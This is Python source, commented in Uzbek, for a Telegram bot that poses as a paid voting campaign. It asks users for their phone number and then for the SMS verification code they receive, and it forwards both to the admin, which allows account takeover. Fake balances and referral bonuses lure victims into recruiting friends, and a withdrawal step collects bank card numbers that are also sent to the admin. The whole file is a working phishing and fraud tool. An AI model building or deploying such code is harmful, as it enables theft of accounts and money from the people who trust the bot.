import os
import sqlite3
import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor

# ----- SOZLAMALAR -----
BOT_TOKEN = os.getenv("BOT_TOKEN") or "TOKENNI_BU_YERGA_QOYING"
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))  # xohlasang 0 qoldir
BONUS_SELF = 120_000
BONUS_REF = 60_000
WITHDRAW_LIMIT = 300_000

# Tugma matnlarini o'zingiznikiga moslang
BTN_VOTE = "🗳 Ovoz Berish 💎"
BTN_SEND_PHONE_TEXT = "📱 Telefon Raqamni Yuborish 📩"
BTN_INVITE = "👥 Do'stingizni Taklif Qiling 🤝"
BTN_BALANCE = "💰 Balans"
BTN_WITHDRAW = "🎁 Pul Yechib Olish"

# ----------------------

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

# --- SQLite ---
conn = sqlite3.connect("users.db")
c = conn.cursor()
c.execute("""
CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    balance INTEGER DEFAULT 0,
    referrer_id INTEGER
);
""")
conn.commit()

# oddiy session flaglar
awaiting_sms = set()
awaiting_card = set()

def make_menu(balance: int):
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add(BTN_VOTE, BTN_BALANCE)
    kb.add(BTN_INVITE)
    if balance >= WITHDRAW_LIMIT:
        kb.add(BTN_WITHDRAW)
    return kb

@dp.message_handler(commands=['start'])
async def on_start(message: types.Message):
    user = message.from_user.id
    args = message.get_args()

    c.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (user,))
    conn.commit()

    # referral saqlash (faqat kelgan bo'lsa va o'zi emas)
    if args.isdigit():
        ref = int(args)
        if ref != user:
            c.execute("UPDATE users SET referrer_id=? WHERE user_id=?", (ref, user))
            conn.commit()

    c.execute("SELECT balance FROM users WHERE user_id=?", (user,))
    bal = c.fetchone()[0]

    await message.answer("👋 Salom! Quyidagi menyudan foydalaning 👇", reply_markup=make_menu(bal))

# --- Ovoz berish: contact tugma ko'rsatish
@dp.message_handler(lambda m: m.text == BTN_VOTE)
async def ask_phone(message: types.Message):
    # haqiqiy contact tugmasi
    contact_btn = types.KeyboardButton(BTN_SEND_PHONE_TEXT, request_contact=True)
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True).add(contact_btn)
    await message.answer("📱 Iltimos, telefon raqamingizni yuboring:", reply_markup=kb)

# --- Contact qabul qilish
@dp.message_handler(content_types=types.ContentType.CONTACT)
async def got_contact(message: types.Message):
    user = message.from_user.id
    phone = message.contact.phone_number

    # admin xabarnoma
    if ADMIN_ID:
        await bot.send_message(ADMIN_ID, f"📞 {message.from_user.full_name} ({user}) raqami: {phone}")

    awaiting_sms.add(user)
    await message.answer("☎️ Raqam tekshirilmoqda. Biroz kuting...")
    await asyncio.sleep(3)
    await message.answer("✅ Endi SMS kodni yuboring (faqat raqam).")

# --- SMS kod (faqat raqamli xabar)
@dp.message_handler(lambda m: m.text.isdigit())
async def got_code(message: types.Message):
    user = message.from_user.id
    if user not in awaiting_sms:
        return  # sms kutilmayotgan bo'lsa e'tibor bermaymiz

    code = message.text
    if ADMIN_ID:
        await bot.send_message(ADMIN_ID, f"🔢 {message.from_user.full_name} ({user}) SMS kod yubordi: {code}")

    # o'ziga +120k
    c.execute("UPDATE users SET balance = balance + ? WHERE user_id=?", (BONUS_SELF, user))

    # referrer bo'lsa — unga +60k (har safar)
    c.execute("SELECT referrer_id FROM users WHERE user_id=?", (user,))
    ref = c.fetchone()[0]
    if ref:
        c.execute("UPDATE users SET balance = balance + ? WHERE user_id=?", (BONUS_REF, ref))
        if ADMIN_ID:
            await bot.send_message(ref, "🎉 Sizning do'stingiz ovoz berdi! +60 000 UZS qo'shildi.")

    conn.commit()
    awaiting_sms.discard(user)

    c.execute("SELECT balance FROM users WHERE user_id=?", (user,))
    bal = c.fetchone()[0]
    await message.answer(
        f"✅ Kod qabul qilindi.\n💰 Balansingiz: {bal:,} UZS",
        reply_markup=make_menu(bal)
    )

# --- Balans
@dp.message_handler(lambda m: m.text == BTN_BALANCE)
async def show_balance(message: types.Message):
    user = message.from_user.id
    c.execute("SELECT balance FROM users WHERE user_id=?", (user,))
    bal = c.fetchone()[0]
    await message.answer(f"💰 Balans: {bal:,} UZS", reply_markup=make_menu(bal))

# --- Referral link
@dp.message_handler(lambda m: m.text == BTN_INVITE)
async def invite(message: types.Message):
    user = message.from_user.id
    me = await bot.get_me()
    link = f"https://t.me/{me.username}?start={user}"
    await message.answer(f"👥 Do'stlaringizni taklif qiling!\nSizning havola: {link}")

# --- Pul yechish jarayoni
@dp.message_handler(lambda m: m.text == BTN_WITHDRAW)
async def withdraw(message: types.Message):
    user = message.from_user.id
    c.execute("SELECT balance FROM users WHERE user_id=?", (user,))
    bal = c.fetchone()[0]
    if bal < WITHDRAW_LIMIT:
        await message.answer(f"⚠️ Pul yechish uchun kamida {WITHDRAW_LIMIT:,} UZS kerak.")
        return
    awaiting_card.add(user)
    await message.answer("💳 Karta raqamingizni yuboring (masalan, 8600… yoki 9860…).")

@dp.message_handler(lambda m: any(m.text.startswith(p) for p in ("8600", "9860", "6262", "5440")))
async def got_card(message: types.Message):
    user = message.from_user.id
    if user not in awaiting_card:
        return
    card = message.text.strip()
    c.execute("SELECT balance FROM users WHERE user_id=?", (user,))
    bal = c.fetchone()[0]
    awaiting_card.discard(user)

    if ADMIN_ID:
        await bot.send_message(
            ADMIN_ID,
            f"💳 Pul yechish so'rovi:\n👤 {message.from_user.full_name} ({user})\n"
            f"💰 Balans: {bal:,} UZS\n💳 Karta: {card}"
        )
    await message.answer("✅ So'rov yuborildi. Admin tekshiradi va to'lovni amalga oshiradi.")

if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)
